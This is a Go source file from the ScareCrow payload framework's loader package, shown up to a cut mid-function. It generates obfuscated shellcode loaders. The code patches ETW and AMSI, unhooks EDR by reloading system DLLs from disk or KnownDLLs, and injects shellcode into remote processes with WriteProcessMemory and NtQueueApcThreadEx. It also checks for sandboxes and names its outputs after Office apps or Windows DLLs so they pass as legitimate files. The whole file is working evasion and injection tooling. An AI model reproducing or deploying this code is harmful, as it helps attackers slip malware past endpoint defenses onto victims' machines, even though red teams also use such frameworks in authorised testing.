package Loader

import (
	"ScareCrow/Cryptor"
	"ScareCrow/Struct"
	"ScareCrow/Utils"
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"text/template"
)

type Binary struct {
	Variables map[string]string
}

type JScript struct {
	Variables map[string]string
}

type JScriptLoader struct {
	Variables map[string]string
}

type SandboxJScript struct {
	Variables map[string]string
}

type ETW struct {
	Variables map[string]string
}

type AMSI struct {
	Variables map[string]string
}

type Console struct {
	Variables map[string]string
}

type WriteProcessMemory struct {
	Variables map[string]string
}

type Header struct {
	Variables map[string]string
}

type Sandboxfunction struct {
	Variables map[string]string
}
type Sandbox_DomainJoined struct {
	Variables map[string]string
}
type HTALoader struct {
	Variables map[string]string
}
type Macro struct {
	Variables map[string]string
}
type Shellcode struct {
	Variables map[string]string
}

type Shellcode_Loader struct {
	Variables map[string]string
}

type Reload struct {
	Variables map[string]string
}

var (
	buffer bytes.Buffer
)

func FileName(mode string) (string, string) {
	var filename string
	var name string
	wscript := []string{"APMon", "bisrv", "btpanui", "certcli", "cmdext", "httpapi", "libcrypto", "netlogon", "tcpmon"}
	dllname := []string{"apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"}
	cplname := []string{"appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"}
	officename := []string{"Timesheet", "Reports", "Zoom", "Updates", "Calculator", "Calendar", "Memo", "Desk", "Appwiz"}
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}

	if mode == "excel" {
		name = officename[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".xll"
	}
	if mode == "control" {
		name = cplname[Cryptor.GenerateNumer(0, 20)]
		filename = name + ".cpl"
	}
	if mode == "wscript" {
		name = wscript[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}

	if mode == "dll" {
		name = dllname[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}

	if mode == "msiexec" {
		name = dllname[Cryptor.GenerateNumer(0, 9)]
		filename = name + ".dll"
	}
	if mode == "binary" {
		name = Binaryname[Cryptor.GenerateNumer(0, 8)]
		filename = name + ".exe"
	}
	return name, filename
}

func ETW_Buff(b64number int, decode string, WriteProcessMemory string) (string, string, string) {
	var buffer bytes.Buffer
	ETW := &ETW{}
	ETW.Variables = make(map[string]string)
	ETW.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwNotificationRegister"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventRegister"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventWriteFull"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["procEtwEventWrite"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["WriteProcessMemory"] = WriteProcessMemory
	ETW.Variables["ETW"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["handle"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["dataAddr"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["i"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["data"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["nLength"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)

	ETW.Variables["RemoteETW"] = Cryptor.VarNumberLength(4, 9)
	ETW.Variables["decode"] = decode
	ETW.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)
	ETW.Variables["EtwNotificationRegisterName"] = Utils.StringEncode("EtwNotificationRegister", b64number)
	ETW.Variables["EtwEventRegisterName"] = Utils.StringEncode("EtwEventRegister", b64number)
	ETW.Variables["EtwEventWriteFullName"] = Utils.StringEncode("EtwEventWriteFull", b64number)
	ETW.Variables["EtwEventWriteName"] = Utils.StringEncode("EtwEventWrite", b64number)

	buffer.Reset()
	ETWTemplate, err := template.New("ETW").Parse(Struct.ETW_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := ETWTemplate.Execute(&buffer, ETW); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), ETW.Variables["ETW"], ETW.Variables["RemoteETW"]
}

func AMSI_Buff(WriteProcessMemory string) (string, string) {
	var buffer bytes.Buffer
	AMSI := &AMSI{}
	AMSI.Variables = make(map[string]string)
	AMSI.Variables["AMSI"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["WriteProcessMemory"] = WriteProcessMemory
	AMSI.Variables["handle"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["addr"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["ll"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["data"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["nLength"] = Cryptor.VarNumberLength(4, 9)
	AMSI.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()
	AMSITemplate, err := template.New("AMSI").Parse(Struct.AMSI_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := AMSITemplate.Execute(&buffer, AMSI); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), AMSI.Variables["AMSI"]
}

func WriteProcessMemory_Buff(number string, b64number int) (string, string, string) {
	var buffer bytes.Buffer
	WriteProcessMemory := &WriteProcessMemory{}
	WriteProcessMemory.Variables = make(map[string]string)
	WriteProcessMemory.Variables["errnoERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["errERROR_IO_PENDING"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)
	WriteProcessMemory.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["hProcess"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpBuffer"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["nSize"] = Cryptor.VarNumberLength(4, 9)
	WriteProcessMemory.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(4, 9)

	buffer.Reset()
	WriteProcessMemoryTemplate, err := template.New("WriteProcessMemory").Parse(Struct.WriteProcessMemory_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := WriteProcessMemoryTemplate.Execute(&buffer, WriteProcessMemory); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), WriteProcessMemory.Variables["decode"], WriteProcessMemory.Variables["WriteProcessMemory"]
}

func Imports_Buff(binary bool, console bool, sandbox bool, injection string, evasion string, ETW bool, AMSI bool) string {
	var buffer bytes.Buffer
	Imports := &Header{}
	Imports.Variables = make(map[string]string)

	if binary == false {
		Imports.Variables["CPORT"] = `import "C"`
	} else {
		Imports.Variables["CPORT"] = ""
	}
	if binary == true || (binary == false && AMSI == false) {
		Imports.Variables["Windows_Import"] = `"golang.org/x/sys/windows"`
	} else {
		Imports.Variables["Windows_Import"] = `"golang.org/x/sys/windows"`
	}
	if evasion == "KnownDLL" {
		Imports.Variables["debugpeimport"] = `filepe "debug/pe"`
		Imports.Variables["AdditionalImports"] = `"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"`
		Imports.Variables["fmt"] = `"fmt"`
		if injection != "" {
			Imports.Variables["fmt"] = `"fmt"
			"io/ioutil"`
		}
	}
	if evasion == "Disk" {
		Imports.Variables["debugpeimport"] = `"debug/pe"`
		Imports.Variables["AdditionalImports"] = ""
		if binary == false {
			Imports.Variables["fmt"] = `"fmt"
			"io/ioutil"`
		} else {
			Imports.Variables["fmt"] = `"fmt"
			"io/ioutil"`
		}
	}
	if evasion == "None" {
		Imports.Variables["debugpeimport"] = ""
		Imports.Variables["AdditionalImports"] = ""
		if binary == false {
			//temp fix for DLLs with None
			Imports.Variables["fmt"] = `"fmt"`
		} else {
			Imports.Variables["fmt"] = `"fmt"`
		}
		if injection != "" {
			Imports.Variables["fmt"] = `"fmt"
			"debug/pe"
			"io/ioutil"`
		}
	}
	if binary == true && console == true {
		Imports.Variables["DebugImport"] = `"io"
					"os"`
	} else {
		Imports.Variables["DebugImport"] = ""
	}
	if sandbox == true {
		if console == true {
			Imports.Variables["SandboxOS"] = ""
		} else {
			Imports.Variables["SandboxOS"] = `"os"`
		}
	} else {
		Imports.Variables["SandboxOS"] = ""
	}
	if ETW == false || AMSI == false || injection != "" {
		Imports.Variables["HEX_Import"] = `"encoding/hex"`
	} else {
		Imports.Variables["HEX_Import"] = ""
	}
	if binary == false && injection == "" {
		Imports.Variables["Time_Import"] = ""
	} else {
		Imports.Variables["Time_Import"] = `"time"`
	}

	ImportTemplate, err := template.New("Imports").Parse(Struct.Imports())
	if err != nil {
		log.Fatal(err)
	}
	if err := ImportTemplate.Execute(&buffer, Imports); err != nil {
		log.Fatal(err)
	}

	return buffer.String()
}

func Header_Buff(binary bool, AMSI bool, ETW bool, ProcessInjection string, console bool, sandbox bool, evasion string) (string, string, string, string, string, string, string, string, string, string, string, string, string) {
	var buffer bytes.Buffer
	Header := &Header{}
	Header.Variables = make(map[string]string)
	Sandboxfunction := &Sandboxfunction{}
	Sandboxfunction.Variables = make(map[string]string)
	Sandbox_DomainJoined := &Sandbox_DomainJoined{}
	Sandbox_DomainJoined.Variables = make(map[string]string)
	Console := &Console{}
	Console.Variables = make(map[string]string)

	Header.Variables["Imports"] = Imports_Buff(binary, console, sandbox, ProcessInjection, evasion, ETW, AMSI)

	Header.Variables["PROCESS_ALL_ACCESS"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["customsyscall"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["customsyscallVP"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["number"] = Cryptor.VarNumberLength(4, 9)

	Header.Variables["Sandboxfunction"] = Cryptor.VarNumberLength(4, 9)

	Header.Variables["Versionfunc"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["k"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["Version"] = Cryptor.VarNumberLength(4, 9) //need to export this
	Header.Variables["MV"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["MinV"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["customsyscall"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["customsyscallVP"] = Cryptor.VarNumberLength(4, 9)

	Header.Variables["decoded"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["b64"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["sum"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["WriteProcessMemory_Function"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["ETW_Function"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["AMSI_Function"] = Cryptor.VarNumberLength(4, 9)
	Header.Variables["FindAddress"] = Cryptor.VarNumberLength(4, 9)
	b64number := Cryptor.GenerateNumer(3, 6)
	Header.Variables["b64number"] = strconv.Itoa(b64number)

	if console == true {
		Header.Variables["Debug"] = ` 
			var (
				debugWriter io.Writer
			)
			
			func printDebug(format string, v ...interface{}) {
				debugWriter = os.Stdout
				output := fmt.Sprintf("[DEBUG] ")
				output += format +"\n"
				fmt.Fprintf(debugWriter, output, v...)
			}
		`
	} else {
		Header.Variables["Debug"] = ""
	}
	WriteProcessMemory_Function, decode, WriteProcessMemory := WriteProcessMemory_Buff(Header.Variables["b64number"], b64number)
	if (ETW == false || AMSI == false) || ProcessInjection != "" {
		Header.Variables["decode"] = decode
		Header.Variables["WriteProcessMemory_Function"] = WriteProcessMemory_Function
		Header.Variables["WriteProcessMemory"] = WriteProcessMemory
	} else {
		Header.Variables["WriteProcessMemory_Function"] = ""
		Header.Variables["decode"] = decode
	}
	if ETW == false {
		ETW_Function, ETW, RemoteETW := ETW_Buff(b64number, Header.Variables["decode"], Header.Variables["WriteProcessMemory"])
		Header.Variables["ETW"] = ETW + "()"
		Header.Variables["RemoteETW"] = RemoteETW
		Header.Variables["ETW_Function"] = ETW_Function
		Header.Variables["B64"] = `"encoding/base64"`
	} else {
		Header.Variables["ETW"] = ""
		Header.Variables["RemoteETW"] = ""
		Header.Variables["ETW_Function"] = ""
		Header.Variables["B64"] = ``
	}
	if AMSI == false {
		AMSI_Function, AMSI := AMSI_Buff(Header.Variables["WriteProcessMemory"])
		Header.Variables["AMSI_Function"] = AMSI_Function
		Header.Variables["AMSI"] = AMSI + "()"

	} else {
		Header.Variables["AMSI_Function"] = ""
		Header.Variables["AMSI"] = ""
	}
	if AMSI == false {
		AMSI_Function, AMSI := AMSI_Buff(Header.Variables["WriteProcessMemory"])
		Header.Variables["AMSI_Function"] = AMSI_Function
		Header.Variables["AMSI"] = AMSI + "()"

	} else {
		Header.Variables["AMSI_Function"] = ""
		Header.Variables["AMSI"] = ""
	}

	if binary == true {
		Console.Variables["decode"] = Header.Variables["decode"]
		Console.Variables["Console"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["getWin"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["showWin"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["hwnd"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["show"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["SW_RESTORE"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["SW_HIDE"] = Cryptor.VarNumberLength(10, 19)
		Console.Variables["GetConsoleWindowName"] = Utils.StringEncode("GetConsoleWindow", b64number)
		Console.Variables["ShowWindowName"] = Utils.StringEncode("ShowWindow", b64number)

		ConsoleTemplate, err := template.New("Console").Parse(Struct.Console())
		if err != nil {
			log.Fatal(err)
		}
		if err := ConsoleTemplate.Execute(&buffer, Console); err != nil {
			log.Fatal(err)
		}
		Header.Variables["Console_Function"] = buffer.String()
		buffer.Reset()
	} else {
		Header.Variables["Console_Function"] = ""
	}

	if sandbox == true {
		Header.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
		Header.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
		Header.Variables["status"] = Cryptor.VarNumberLength(10, 19)
		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err := SandboxFunctionTemplate.Execute(&buffer, Header); err != nil {
			log.Fatal(err)
		}
		Header.Variables["Sandboxfunction"] = buffer.String()
		Header.Variables["checker"] = Cryptor.VarNumberLength(10, 19)
		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainJoined())
		buffer.Reset()
		if err != nil {
			log.Fatal(err)
		}
		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, Header); err != nil {
			log.Fatal(err)
		}
		Header.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		Header.Variables["Sandbox"] = ""
		Header.Variables["Sandboxfunction"] = ""
		Header.Variables["SandboxImport"] = ""
		Header.Variables["SandboxOS"] = ""
	}

	HeaderTemplate, err := template.New("Header").Parse(Struct.Header())
	if err != nil {
		log.Fatal(err)
	}
	if err := HeaderTemplate.Execute(&buffer, Header); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), Header.Variables["ETW"], Header.Variables["AMSI"], Header.Variables["Versionfunc"], Header.Variables["Version"], Header.Variables["customsyscall"], Header.Variables["customsyscallVP"], Header.Variables["Sandbox"], Console.Variables["Console"], Header.Variables["PROCESS_ALL_ACCESS"], Header.Variables["WriteProcessMemory"], Header.Variables["FindAddress"], Header.Variables["RemoteETW"]

}

func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool, export string, Exec_Type string, evasion string) (string, string, string) {
	var Structure, ReloadCode string
	var binary bool
	var buffer bytes.Buffer
	Binary := &Binary{}
	Binary.Variables = make(map[string]string)
	Reload := &Reload{}
	Reload.Variables = make(map[string]string)
	if mode == "binary" {
		binary = true
		Structure = Struct.Binary()
	} else {
		binary = false
		Structure = Struct.DLL_Refresher()
		if mode == "excel" {
			Binary.Variables["ExportFunction"] = ``
			Binary.Variables["ExportName"] = Struct.JS_Office_Export()
		}
		if mode == "control" {
			Binary.Variables["ExportFunction"] = ``
			Binary.Variables["ExportName"] = Struct.JS_Control_Export()
		}
		if mode == "wscript" || mode == "dll" {
			Binary.Variables["ExportFunction"] = ``
			Binary.Variables["ExportName"] = Struct.WS_JS_Export()
		}
		if mode == "dll" && export != "" {
			Binary.Variables["ExportFunction"] = `//export ` + export + `
		func ` + export + `() {
			Run()
		}`
			Binary.Variables["ExportName"] = Struct.WS_JS_Export()
		}
		if mode == "msiexec" {
			Binary.Variables["ExportName"] = Struct.WS_JS_Export()
			Binary.Variables["ExportFunction"] = ``
		}
	}
	Header, ETWFunctionName, AMSIFunctionName, Versionfunc, Version, customsyscall, customsyscallVP, Sandbox, Console, PROCESS_ALL_ACCESS, WriteProcessMemory, FindAddress, RemoteETWFunctionName := Header_Buff(binary, AMSI, ETW, ProcessInjection, console, sandbox, evasion)
	Shellcode_Exec, Shellcode_Exec_Function, Raw_Bin := Shellcode_Loader_Buff(Exec_Type, ProcessInjection, customsyscall, customsyscallVP, PROCESS_ALL_ACCESS, WriteProcessMemory, console, FindAddress, RemoteETWFunctionName)
	Binary.Variables["Shellcode_Exec"] = Shellcode_Exec
	Binary.Variables["Shellcode_Exec_Function"] = Shellcode_Exec_Function
	Binary.Variables["raw_bin"] = Raw_Bin
	Binary.Variables["Header"] = Header
	Binary.Variables["ETW"] = ETWFunctionName
	Binary.Variables["AMSI"] = AMSIFunctionName
	Binary.Variables["Versionfunc"] = Versionfunc
	Binary.Variables["Version"] = Version
	Binary.Variables["customsyscall"] = customsyscall
	Binary.Variables["customsyscallVP"] = customsyscallVP
	Binary.Variables["Console"] = Console
	Binary.Variables["Sandbox"] = Sandbox
	Binary.Variables["Reloading"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19) + "()"
	Binary.Variables["FuncName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)

	Reload.Variables["customsyscallVP"] = Binary.Variables["customsyscallVP"]
	Reload.Variables["customsyscall"] = Binary.Variables["customsyscall"]
	Reload.Variables["Reloading"] = Binary.Variables["Reloading"]
	Reload.Variables["DLLname"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["runfunc"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["dllBase"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["dllOffsetdata"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["dll"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["error"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["handlez"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["handle"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["loaddll"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["loc"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["mem"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["oldfartcodeperms"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["regionsize"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["x"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["file"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["ntPathW"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["ntPath"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["DLL"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["objectAttributes"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["KnownDll"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["fullbytes"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["rawdata"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["CleanSystemDLL"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["sztViewSize"] = Cryptor.VarNumberLength(10, 19)

	Reload.Variables["Address"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["FindAddress"] = FindAddress
	Reload.Variables["NtOpenSection"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["NtMapViewOfSection"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["mxKeSFQASvbvx"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["ttttt"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["procNtOpenSection"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["procNtMapViewOfSection"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["procNtUnmapViewOfSection"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["sstring"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["KnownDLL"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["WriteMemoryfunc"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["index"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["writePtr"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["inbuf"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["destination"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["v"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["xx"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["handlee"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["filee"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["ddhandlez"] = Cryptor.VarNumberLength(10, 19)
	Reload.Variables["loaddlll"] = Cryptor.VarNumberLength(10, 19)

	if evasion == "KnownDLL" {
		if console == true {
			Reload.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: C:\\\\Windows\\\\System32\\\\\"+" + Reload.Variables["DLL"] + "+\" \")"
		} else {
			Reload.Variables["ReloadingMessage"] = ``
		}
		ReloadTemplate, err := template.New("Reload").Parse(Struct.KnownDLL_Refresh())

		if err != nil {
			log.Fatal(err)
		}

		if err := ReloadTemplate.Execute(&buffer, Reload); err != nil {
			log.Fatal(err)
		}

		ReloadCode = buffer.String()
	}
	if evasion == "Disk" {
		if console == true {
			Reload.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+" + Reload.Variables["DLLname"] + "[i]+\" \")"
		} else {
			Reload.Variables["ReloadingMessage"] = ``
		}
		ReloadTemplate, err := template.New("Reload").Parse(Struct.Disk_Refresh())
		if err != nil {
			log.Fatal(err)
		}
		if err := ReloadTemplate.Execute(&buffer, Reload); err != nil {
			log.Fatal(err)
		}
		ReloadCode = buffer.String()
	}
	if evasion == "None" {
		Binary.Variables["Reloading"] = ""
		Reload.Variables["ReloadingMessage"] = ""
		ReloadCode = ""
	}

	Binary.Variables["ReloadFunction"] = ReloadCode
	buffer.Reset()

	if console == true {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
		Binary.Variables["RefreshPE"] = "printDebug(\"RefreshPE failed:\", err)"
		Binary.Variables["EDR"] = "printDebug(\"[+] EDR removed\")"

		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + Binary.Variables["Version"] + ")"
		Binary.Variables["AllocatingMessage"] = "printDebug(\"[+] Allocating a RWX section of the process\")"
		Binary.Variables["RtlCopyMemoryMessage"] = "printDebug(\"[+] Copying shellcode to memory with RtlCopyMemory\")"
		Binary.Variables["VirtualProtectMessage"] = "printDebug(\"[+] Calling a custom syscall version of NtProtectVirtualMemory to change memory to not writeable\")"
		Binary.Variables["GetCurrentThreadMessage"] = "printDebug(\"[+] Calling GetCurrentThread to get a handle on the current process\")"
		Binary.Variables["NtQueueApcThreadExMessage"] = "printDebug(\"[+] Calling NtQueueApcThreadEx to execute shellcode\")"
		Binary.Variables["SyscallMessage"] = "printDebug(\"[*] Calling shellcode using a System Call\")"

		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + Binary.Variables["Version"] + ")"
		Binary.Variables["PPIDMessage"] =
			`strpid := fmt.Sprint(` + Binary.Variables["pi"] + `.ProcessId)
	printDebug("[*] Creating Remote Process: " + strpid)
	printDebug("[*] Creating Handle to Remote Process")`
		Binary.Variables["ModuleMessage"] = "printDebug(\"[*] Mapping Modules:\")"
		Binary.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
		Binary.Variables["RemoteModuleEnumeration"] =
			`` + Binary.Variables["addr"] + `:= fmt.Sprintf("%X", ` + Binary.Variables["MI"] + `.LpBaseOfDll)
			printDebug("[+] " + ` + Binary.Variables["s"] + ` + "'s Base Address: " + ` + Binary.Variables["addr"] + `)
			printDebug("[*] Reloading " + ` + Binary.Variables["s"] + ` + "'s .Text Field")`
		Binary.Variables["RemoteModuleMessage"] = "printDebug(\"[+] Reloaded and unhooked EDR\")"
		Binary.Variables["RemoteReloading"] = "printDebug(\"[+] Interacting with Remote Process\")"
		Binary.Variables["Injecting"] = "printDebug(\"[+] Injecting Shellcode into Remote Process\")"
		Binary.Variables["Injected"] = "printDebug(\"[+] Injected!\")"
	} else {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(false)"
		Binary.Variables["Debug"] = ""
		Binary.Variables["RefreshPE"] = ""
		Binary.Variables["EDR"] = ""
		Binary.Variables["ShellcodeString"] = ""
		Binary.Variables["Pointer"] = ""
		Binary.Variables["CopyPointer"] = ""
		Binary.Variables["OverwrittenShellcode"] = ""
		Binary.Variables["OverWrittenPoint"] = ""
		Binary.Variables["ReloadingMessage"] = ""
		Binary.Variables["VersionMessage"] = ""

		Binary.Variables["RemoteModuleEnumeration"] = ""
		Binary.Variables["PPIDMessage"] = ""
		Binary.Variables["ModuleMessage"] = ""
		Binary.Variables["RemoteModuleMessage"] = ""
		Binary.Variables["RemoteReloading"] = ""
		Binary.Variables["Injecting"] = ""
		Binary.Variables["Injected"] = ""

		Binary.Variables["AllocatingMessage"] = ""
		Binary.Variables["RtlCopyMemoryMessage"] = ""
		Binary.Variables["VirtualProtectMessage"] = ""
		Binary.Variables["GetCurrentThreadMessage"] = ""
		Binary.Variables["NtQueueApcThreadExMessage"] = ""
		Binary.Variables["SyscallMessage"] = ""

	}

	if Sleep == false {
		Binary.Variables["SleepSecond"] = strconv.Itoa(Cryptor.GenerateNumer(2220, 2900))
		fmt.Println("[+] Sleep Timer set for " + Binary.Variables["SleepSecond"] + " milliseconds ")
	} else {
		Binary.Variables["SleepSecond"] = "0"
	}

	BinaryTemplate, err := template.New("Binary").Parse(Structure)
	if err != nil {
		log.Fatal(err)
	}
	if err := BinaryTemplate.Execute(&buffer, Binary); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), Binary.Variables["FuncName"], Binary.Variables["NTFuncName"]
}

func Shellcode_Loader_Buff(Exec_Type string, ProcessInjection string, customsyscall string, customsyscallVP string, PROCESS_ALL_ACCESS string, WriteProcessMemory string, console bool, FindAddress string, RemoteETWFunctionName string) (string, string, string) {
	var buffer bytes.Buffer
	var Structure string
	Shellcode_Loader := &Shellcode_Loader{}
	Shellcode_Loader.Variables = make(map[string]string)

	Shellcode_Loader.Variables["FunctionName"] = Cryptor.CapLetter() + Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["customsyscall"] = customsyscall
	Shellcode_Loader.Variables["customsyscallVP"] = customsyscallVP

	//Syscall_RtlCopy
	Shellcode_Loader.Variables["regionsize"] = Cryptor.VarNumberLength(4, 9)
	Shellcode_Loader.Variables["errnoErr"] = Cryptor.VarNumberLength(4, 9)
	Shellcode_Loader.Variables["ptr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["alloc"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["phandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["baseA"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["zerob"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["alloctype"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["protect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["regionsize"] = Cryptor.VarNumberLength(4, 9)

	//Syscall_Alloc
	Shellcode_Loader.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["phandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["baseA"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["zerob"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["alloctype"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["protect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["regionsizep"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["regionsize"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ptr"] = Cryptor.VarNumberLength(10, 19)
